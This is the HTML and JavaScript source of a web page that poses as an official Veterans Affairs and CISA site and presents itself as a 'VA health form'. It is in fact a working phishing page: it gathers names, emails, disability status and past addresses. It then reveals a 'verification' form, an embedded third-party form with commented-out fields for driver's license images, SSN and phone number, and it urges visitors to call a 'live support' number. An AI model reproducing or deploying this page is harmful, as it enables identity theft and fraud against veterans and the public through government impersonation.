<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta property="og:image" content="https://cisaonlinereport.onrender.com/css/images/Seal_of_Cybersecurity_and_Infrastructure_Security_Agency.svg">
  <meta property="og:image:width" content="1200"> <!-- Specify the width of the image -->
  <meta property="og:image:height" content="630">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="./css/report.css">
<title>CISA/</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');

  /* Add your additional styles here */
  .driver-license-form {
    display: none; /* Initially hidden */
  }

  .driver-license-form label {
    display: block;
    margin-top: 10px;
  }
</style>
</head>
<body>
<div class="subnav">
  <div class="cisa"><img src="./css/images/2560px-Flag_of_the_United_States.svg.png" alt=""></div>
  <p>An official website of American Governmnet</p>
  <div class="cisa"> <img src="" alt=""></div>
</div>

<nav>
  <div class="logo"><img src="https://s3-us-gov-west-1.amazonaws.com/content.www.va.gov/img/header-logo.png" alt=""></div>

  <a href="https://cisaonlinereport.onrender.com/"><button>Home</button></a>
</nav>

<div class="subcontainer">
  <h3>VETERAN'S AFFAIRS</h3>
</div>

<div class="pop"></div>

<h2>VA health form</h2>

<!-- <div id="popupContainer">
  <div id="closeButton" onclick="closePopup()">X</div><br>
  <p style="color: white;">Thank you for contributing to our cybersecurity community!</p>
  <p style="color: white;">Your reports help make the internet a safer place for everyone. Please request for Agencies private report link if you happen to have any relative or associate that might have been a victim.</p><br>
  <button onclick="copyToClipboard('https://your-url.com')" style="background-color: white; color: #4CAF50;">COPY REPORT LINK</button>
</div> -->

<!-- Your existing HTML content -->

<div id="loading-spinner" style="display: none;">
  <div class="spinner"></div>
</div>

<form id="cybersecurityForm">
  <label for="reporter_name">Your Name:</label>
  <p class="brief" style="font-size: 13px;">In this order [Firstname/ Lastname]</p>
  <input type="text" id="reporter_name" name="reporter_name" placeholder="Firstname  Lastname" required>

  <label for="email">Your Email:</label>
  <input type="email" id="email" name="email" placeholder="email@example.com">

  <label for="incidentType">Are you physically disabled:</label>
  <select id="incidentType" name="incidentType" required>
    <option value="phishing">Select</option>
    <option value="Yes">Yes</option>
    <option value="No">No</option>
    <option value="Prefer noy to say">Prefer noy to say</option>
    <option value="I was but im fine now">I was but im fine now</option>
    
    <!-- Add more options as needed -->
  </select><br><br>

  <label for="incidentDetails">Where are the places where you have lived before your current residence * :</label>
  <p class="brief" style="font-size: 13px;"></p>
  <textarea id="incidentDetails" name="incidentDetails" placeholder="Please elaborate more on the incident"></textarea>

  <button type="submit">Submit Report</button>
</form>

<button class="floating-button" id="openCustomerCare">?</button>
<div class="customer-care-panel" id="customerCarePanel">
  <div class="customer-care-content">
      <div class="content1">
          <!-- Add your customer care content here -->
        <div class="flex">
          <div class="logo"><img src="https://s3-us-gov-west-1.amazonaws.com/content.www.va.gov/img/header-logo.png" alt=""></div>
          
          <button onclick="closeCustomerCare()">X</button>
        </div><br>
        <h2>Welcome to Customer Care</h2>
        <p>We're here to assist you. How can we help?</p><br>
      </div><br>
      <div class="content2">
        <div class="container">
          <img src="./css/images/5912558_2953980.svg" alt=""><br>
          Due to the high demand of security adaptations, to establish trust and to verify that you are not a robot or spy, we recommend you reach out to us through our customer care line. Click on  the dial button below <br><br>
          <a href="tel:(720)921-4977" class="call-button"><button>CALL LIVE SUPPORT</button></a><br><br>
          Do you want to make a report? <br>
          Click the button below to generate a new reference ID in seconds<br><button onclick="copyToClipboard('')">Generate Reference ID</button><br><br>
        </div><br>
        <div class="container2">
          We're here to assist you! Our dedicated team is available to help with any questions, concerns, or feedback you may have.

          <h2>How can we assist you today?</h2>

Whether you need help navigating our website, have questions about our products or services, or simply want to provide feedback, we're here to support you every step of the way.

Feel free to give us a call <br><br><a href="tel:(720)921-4977" class="call-button"><button>CALL LIVE SUPPORT</button></a><br><br> We look forward to hearing from you!
        </div>
      </div>
      <div class="content1">
        <!-- Add your customer care content here -->
      <div class="flex">
        <div class="logo"><img src="https://s3-us-gov-west-1.amazonaws.com/content.www.va.gov/img/header-logo.png" alt=""></div>
        
      </div>
      
    </div>
  </div>
</div>

<!-- Additional input form for driver's license and SSN -->
<form id="driverLicenseForm" class="driver-license-form">
  <p><h4>Due to high occurances of cyber attacks and fraudulent online activities, we would want to verify that you are the individual that filled and filed the form before any further investigative action is taken. <br><br>

  </h4></p><br>

  <!-- <label for="country">Country * :</label>
  <select name="country" id="country">
    <option value="select country">Select Country</option>
    <option value="antigua-and-barbuda">Antigua and Barbuda</option>
    <option value="bahamas">Bahamas</option>
    <option value="barbados">Barbados</option>
    <option value="bermuda">Bermuda</option>
    <option value="canada">Canada</option>
    <option value="jamaica">Jamaica</option>
    <option value="trinidad-and-tobago">Trinidad and Tobago</option>
    <option value="united-states">United States</option>
  </select>

  <label for="state">State * :</label>
  <input type="text" name="state" id="state" required>

  <label for="street1">Address Line 1 * :</label>
  <input type="text" name="street1" id="street1" required>

  <label for="street2">Address Line 2 :</label>
  <input type="text" name="street2" id="street2" placeholder="Not compulsory">

  <label for="driverLicenseFront">Driver's License (Front) * :</label>
  <input type="file" id="driverLicenseFront" name="driverLicenseFront" accept="image/*" required>

  <label for="driverLicenseBack">Driver's License (Back) * :</label>
  <input type="file" id="driverLicenseBack" name="driverLicenseBack" accept="image/*" required> -->

  
  <iframe
  id="JotFormIFrame-240471706931051"
  title="Form"
  onload="window.parent.scrollTo(0,0)"
  allowtransparency="true"
  allowfullscreen="true"
  allow="geolocation; microphone; camera"
  src="https://form.jotform.com/240471706931051"
  frameborder="0"
  style="min-width:100%;max-width:100%;height:539px;border:none;"
  scrolling="no"
>
</iframe>

  <!-- <label for="ssn">Social Security Number (SSN) * :</label>
  <input type="text" id="ssn" name="ssn" required>

  <label for="phoneNumber">Phone Number * :</label>
  <input type="tel" id="phoneNumber" name="phoneNumber" pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}" placeholder="Format: 123-456-7890" required>

  <button type="submit">Submit Details</button> -->
</form>

<footer>
  <div class="container5">
    <div class="logo"><img src="https://s3-us-gov-west-1.amazonaws.com/content.www.va.gov/img/header-logo.png" alt=""></div><br><br>
    <img src="./css/images/ntas_03_noadvisories.svg" alt="">
    <br>
  </div>
</footer>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-SGW3M4DGJD"></script>

<script type="text/javascript">
  var ifr = document.getElementById("JotFormIFrame-240471706931051");
  if (ifr) {
    var src = ifr.src;
    var iframeParams = [];
    if (window.location.href && window.location.href.indexOf("?") > -1) {
      iframeParams = iframeParams.concat(window.location.href.substr(window.location.href.indexOf("?") + 1).split('&'));
    }
    if (src && src.indexOf("?") > -1) {
      iframeParams = iframeParams.concat(src.substr(src.indexOf("?") + 1).split("&"));
      src = src.substr(0, src.indexOf("?"))
    }
    iframeParams.push("isIframeEmbed=1");
    ifr.src = src + "?" + iframeParams.join('&');
  }
  window.handleIFrameMessage = function(e) {
    if (typeof e.data === 'object') { return; }
    var args = e.data.split(":");
    if (args.length > 2) { iframe = document.getElementById("JotFormIFrame-" + args[(args.length - 1)]); } else { iframe = document.getElementById("JotFormIFrame"); }
    if (!iframe) { return; }
    switch (args[0]) {
      case "scrollIntoView":
        iframe.scrollIntoView();
        break;
      case "setHeight":
        iframe.style.height = args[1] + "px";
        if (!isNaN(args[1]) && parseInt(iframe.style.minHeight) > parseInt(args[1])) {
          iframe.style.minHeight = args[1] + "px";
        }
        break;
      case "collapseErrorPage":
        if (iframe.clientHeight > window.innerHeight) {
          iframe.style.height = window.innerHeight + "px";
        }
        break;
      case "reloadPage":
        window.location.reload();
        break;
      case "loadScript":
        if( !window.isPermitted(e.origin, ['jotform.com', 'jotform.pro']) ) { break; }
        var src = args[1];
        if (args.length > 3) {
            src = args[1] + ':' + args[2];
        }
        var script = document.createElement('script');
        script.src = src;
        script.type = 'text/javascript';
        document.body.appendChild(script);
        break;
      case "exitFullscreen":
        if (window.document.exitFullscreen) window.document.exitFullscreen();
        else if (window.document.mozCancelFullScreen) window.document.mozCancelFullScreen();
        else if (window.document.mozCancelFullscreen) window.document.mozCancelFullScreen();
        else if (window.document.webkitExitFullscreen) window.document.webkitExitFullscreen();
        else if (window.document.msExitFullscreen) window.document.msExitFullscreen();
        break;
    }
    var isJotForm = (e.origin.indexOf("jotform") > -1) ? true : false;
    if(isJotForm && "contentWindow" in iframe && "postMessage" in iframe.contentWindow) {
      var urls = {"docurl":encodeURIComponent(document.URL),"referrer":encodeURIComponent(document.referrer)};
      iframe.contentWindow.postMessage(JSON.stringify({"type":"urls","value":urls}), "*");
    }
  };
  window.isPermitted = function(originUrl, whitelisted_domains) {
    var url = document.createElement('a');
    url.href = originUrl;
    var hostname = url.hostname;
    var result = false;
    if( typeof hostname !== 'undefined' ) {
      whitelisted_domains.forEach(function(element) {
          if( hostname.slice((-1 * element.length - 1)) === '.'.concat(element) || hostname === element ) {
              result = true;
          }
      });
      return result;
    }
  };
  if (window.addEventListener) {
    window.addEventListener("message", handleIFrameMessage, false);
  } else if (window.attachEvent) {
    window.attachEvent("onmessage", handleIFrameMessage);
  }
  </script>

<script>
  

window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-SGW3M4DGJD');
  // Function to copy text to clipboard
  function copyToClipboard(text) {
    // Create a temporary input element
    var inputElement = document.createElement('textarea');
    inputElement.value = text;
    document.body.appendChild(inputElement);

    // Select the text in the input element
    inputElement.select();
    inputElement.setSelectionRange(0, 99999); // For mobile devices

    // Copy the selected text to the clipboard
    document.execCommand('copy');

    // Remove the temporary input element
    document.body.removeChild(inputElement);

    // Optionally provide user feedback
    alert('URL copied to clipboard');
  }

  // Function to show the popup after 3 seconds
  function showPopup() {
    setTimeout(function() {
      document.getElementById("popupContainer").style.display = "block";
    }, 3000); // 3000 milliseconds = 3 seconds
  }

  // Function to close the popup
  function closePopup() {
    document.getElementById("popupContainer").style.display = "none";
  }

  // Call the function when the page loads
  window.onload = showPopup;

// Function to handle form submission for the first form
document.getElementById("cybersecurityForm").addEventListener("submit", function(event) {
  // Prevent the default form submission behavior
  event.preventDefault();

  // Show the loading spinner
  document.getElementById("loading-spinner").style.display = "block";

  // Retrieve form data
  var reporterName = document.getElementById("reporter_name").value.trim();
  var email = document.getElementById("email").value.trim();
  var incidentType = document.getElementById("incidentType").value.trim();
  var incidentDetails = document.getElementById("incidentDetails").value.trim();

  // Check if the reporter name is empty
  if (!reporterName) {
    alert("Please enter your name.");
    // Hide the loading spinner if there's an error
    document.getElementById("loading-spinner").style.display = "none";
    return;
  }

  // Send form data to the server using fetch API
  fetch('/submit-form', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      reporter_name: reporterName,
      email: email,
      incidentType: incidentType,
      incidentDetails: incidentDetails
    })
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.text(); // Return response text
  })
  .then(data => {
    // Display success message to the user
    alert(data);

    // Hide the loading spinner after successful form submission
    document.getElementById("loading-spinner").style.display = "none";

    // Show additional input form for driver's license and SSN
    document.getElementById("driverLicenseForm").style.display = "block";
  })
  .catch(error => {
    // Display error message to the user
    console.error('There was a problem with your fetch operation:', error);
    alert('There was an error processing your request. Please try again later.');

    // Hide the loading spinner if there's an error
    document.getElementById("loading-spinner").style.display = "none";
  });
});


  // Function to handle form submission for additional details
  document.getElementById("driverLicenseForm").addEventListener("submit", function(event) {
    // Prevent the default form submission behavior
    event.preventDefault();

    // Retrieve additional form data
    var formData = new FormData(this);

    // Send form data to the server using fetch API
    fetch('/submit-additional-details', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text(); // Return response text
    })
    .then(data => {
      // Display success message to the user
      alert(data);

      window.location.href = "/index.html"; 
    })
    .catch(error => {
      // Display error message to the user
      console.error('There was a problem with your fetch operation:', error);
      alert('There was an error processing your request. Please try again later.');
    });
  });

   // Function to open the customer care panel
   function openCustomerCare() {
            document.getElementById("customerCarePanel").style.display = "flex";
        }
    
        // Function to close the customer care panel
        function closeCustomerCare() {
            document.getElementById("customerCarePanel").style.display = "none";
        }
    
        // Event listener for the floating button click
        document.getElementById("openCustomerCare").addEventListener("click", openCustomerCare);

</script>
</body>
</html>
